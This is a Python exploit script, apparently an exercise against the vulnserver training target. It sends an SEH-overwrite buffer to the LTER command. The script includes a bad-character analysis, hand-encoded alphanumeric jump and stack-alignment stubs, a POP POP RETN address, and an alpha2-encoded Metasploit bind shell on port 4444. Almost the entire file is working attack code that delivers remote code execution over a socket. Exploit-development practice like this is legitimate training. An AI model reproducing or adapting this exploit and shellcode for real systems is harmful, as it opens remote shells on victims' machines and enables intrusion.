#!/usr/bin/python

import socket
import sys

host = "192.168.160.101"
port = 9999

#########################################
## WriTTen by: van6uard
## vulnserver LTER Exploit
## POP POP RETN at 6250172B

#[+] Comparing with memory at location : 0x0138f218 (Stack)
#Only 127 original bytes of 'normal' code found.
#    ,-----------------------------------------------.
#    | Comparison results:                           |
#    |-----------------------------------------------|
#  0 |01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f 10| File
#    |                                               | Memory
# 10 |11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f 20| File
#    |                                               | Memory
# 20 |21 22 23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f 30| File
#    |                                               | Memory
# 30 |31 32 33 34 35 36 37 38 39 3a 3b 3c 3d 3e 3f 40| File
#    |                                               | Memory
# 40 |41 42 43 44 45 46 47 48 49 4a 4b 4c 4d 4e 4f 50| File
#    |                                               | Memory
# 50 |51 52 53 54 55 56 57 58 59 5a 5b 5c 5d 5e 5f 60| File
#    |                                               | Memory
# 60 |61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f 70| File
#    |                                               | Memory
# 70 |71 72 73 74 75 76 77 78 79 7a 7b 7c 7d 7e 7f 80| File
#    |                                             01| Memory
# 80 |81 82 83 84 85 86 87 88 89 8a 8b 8c 8d 8e 8f 90| File
#    |02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f 10 11| Memory
# 90 |91 92 93 94 95 96 97 98 99 9a 9b 9c 9d 9e 9f a0| File
#    |12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f 20 21| Memory
# a0 |a1 a2 a3 a4 a5 a6 a7 a8 a9 aa ab ac ad ae af b0| File
#    |22 23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f 30 31| Memory
# b0 |b1 b2 b3 b4 b5 b6 b7 b8 b9 ba bb bc bd be bf c0| File
#    |32 33 34 35 36 37 38 39 3a 3b 3c 3d 3e 3f 40 41| Memory
# c0 |c1 c2 c3 c4 c5 c6 c7 c8 c9 ca cb cc cd ce cf d0| File
#    |42 43 44 45 46 47 48 49 4a 4b 4c 4d 4e 4f 50 51| Memory
# d0 |d1 d2 d3 d4 d5 d6 d7 d8 d9 da db dc dd de df e0| File
#    |52 53 54 55 56 57 58 59 5a 5b 5c 5d 5e 5f 60 61| Memory
# e0 |e1 e2 e3 e4 e5 e6 e7 e8 e9 ea eb ec ed ee ef f0| File
#    |62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f 70 71| Memory
# f0 |f1 f2 f3 f4 f5 f6 f7 f8 f9 fa fb fc fd fe ff   | File
#    |72 73 74 75 76 77 78 79 7a 7b 7c 7d 7e 7f 80   | Memory
#     `-----------------------------------------------'

#                | File      | Memory    | Note       
# -----------------------------------------------------
# 0   0   127 127 | 01 ... 7f | 01 ... 7f | unmodified!
# -----------------------------------------------------
# 127 127 128 128 | 80 ... ff | 01 ... 80 | corrupted  
# 
# Possibly bad chars: 80
# Bytes omitted from input: 00

# The value in esp is close to our shellcode.  We push it to eax, and calculate the difference to the shellcode
# address and then split it in 3 to keep the values such 14c that is a good character, since 3e4 is not. 
# Then push that value back into ESP.
jump = ""
jump += "\x55\x58"               # push ebp, pop eax
jump += "\x66\x05\x7a\x08"       # add ax, 87a
jump += "\x66\x05\x7a\x08"       # add ax, 87a
jump += "\x50\x5c"               # push eax, pop esp
jump += "\x25\x4A\x4D\x4E\x55"   ## and  eax, 0x554e4d4a
jump += "\x25\x35\x32\x31\x2A"   ## and  eax, 0x2a313235
jump += "\x05\x76\x40\x50\x50"   ## add  eax, 0x50504076
jump += "\x05\x75\x40\x40\x40"   ## add  eax, 0x40404075
jump += "\x50"                   # boom eb 80

#align esp
longjump = ""
longjump += "\x55\x58"          # push ebp, pop eax
longjump += "\x66\x05\x09\x03"  # add ax, 309 to bring esp where we want it
longjump += "\x50\x59"          # push eax, pop ecx stick shellcode where it will sit
longjump += "\x54\x58"          # push esp, pop eax
longjump += "\x2c\x40"          # sub al, 40
longjump += "\x50\x5c"          # push eax, pop esp

# encoded call eax instruction
longjump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
longjump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
longjump += "\x05\x77\x61\x41\x41" ## add  eax, 0x41416177
longjump += "\x05\x66\x62\x41\x41" ## add  eax, 0x41416266
longjump += "\x05\x55\x41\x41\x41" ## add  eax, 0x41414155
longjump += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
longjump += "\x50"                 ## push eax

# msfpayload win32_bind LPORT=4444 R > bindshell-4444.raw
# /opt/alpha2/alpha2 ecx --uppercase < /usr/share/framework2/bindshell-4444.raw
shellcode = "IIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIKL2JZKPMM8L9KOKOKO3PLK2LWTQ4LKW5WLLKSLS5CHUQJOLKPO4XLKQO7PUQJK1YLK6TLK31JN01O0MINLK4IP44TGIQ8JTM5QO2ZKZTGKPTVDVHD5M5LKQO14UQZKRFLKTLPKLKQOELUQJK4CFLLKMYRLWTELSQO3VQYKSTLKG3P0LK1PTLLKRP5LNMLKQP4H1NSXLN0N4NJLPPKON63VV32FSXFSWBRH472SVR1OPTKOXPSX8KJMKLGKPPKOXVQOK9M52FK1JMS8DB653ZC2KOXP2HYIC9L5NMQGKOYFF3F3PSPSPSPC0SQSQCKOXPSV3XDQQLCV63MYKQLUE8Y4UJ2PYWPWKON6RJ200QF5KON02HOTNM6NZIPWKOHVPS65KON0RHKU0IMVQY0WKO8V0PV4PTV5KO8PLS3XM73IO6D9F7KON61EKO8PRF2JE4U6583SBMMYM53ZPP0Y7YHLMYKW3Z0DK9KRFQ9PZSNJKN1RFMKNQRVLLSLMRZ6XNKNKNKRHSBKNH34VKORUQTKO8VQKPW62V10Q0QSZEQPQPQPU0QKON0SXNMYIC5HNQCKOIFRJKOKOFWKOXPLKQGKLMSYTU4KON6QBKOXPE8JPMZ5TQOF3KOIFKO8PA"

buf = 'LTER /.:/' 
buf += shellcode
buf += 'A'*(3515-82-len(shellcode))
buf += longjump
buf += 'B'*(82-len(longjump))
buf += "\x77\x06\x76\x06"   #NSEH conditional jump forward
#buf += '\x4c\x4c\x77\xff'   #NSEH Conditional Jump
buf += '\x2b\x17\x50\x62'   #SEH
buf += 'D'*3
buf += jump             # calculated jump shellcode
buf += 'E'*(5000-3515-4-4-4-len(jump))
buf += '\x00\x00'

try:
    c = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #tcp socket
    c.connect((host, port))
    c.send(buf + '\r\n')
    print "[+] Evil buffer sent"
    c.close()

except:
    print "[-] Can't send evil buffer"
    sys.exit()
